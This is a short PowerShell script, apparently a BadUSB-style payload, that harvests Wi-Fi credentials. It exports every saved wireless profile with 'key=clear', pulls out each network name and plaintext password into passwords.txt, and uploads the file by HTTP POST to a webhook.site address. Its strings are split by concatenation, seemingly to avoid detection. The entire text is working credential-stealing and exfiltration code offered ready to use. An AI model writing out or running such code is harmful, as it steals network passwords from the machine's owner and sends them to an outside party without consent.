$a = "pass" + "words.txt"
$b = "$env:TEMP\w" + "ifi"
$c = "https://" + "webhook.site/" + "<YOUR_UNIQUE_ID>"

ni -it d -p $b -f | Out-Null
cd $b

"Your passwords:`n" | Out-File $a -Encoding UTF8

netsh wlan export profile key=clear | Out-Null

gci *.xml | % {
    [xml]$x = gc $_.FullName
    $n = $x.WLANProfile.name
    $k = $x.WLANProfile.MSM.security.sharedKey.keyMaterial

    if ($n -and $k) {
        "SSID: $n`nPassword: $k`n" | Out-File $a -Append
    }
}

gc $a

iwr -Uri $c -Method POST -InFile $a -ContentType "text/plain"
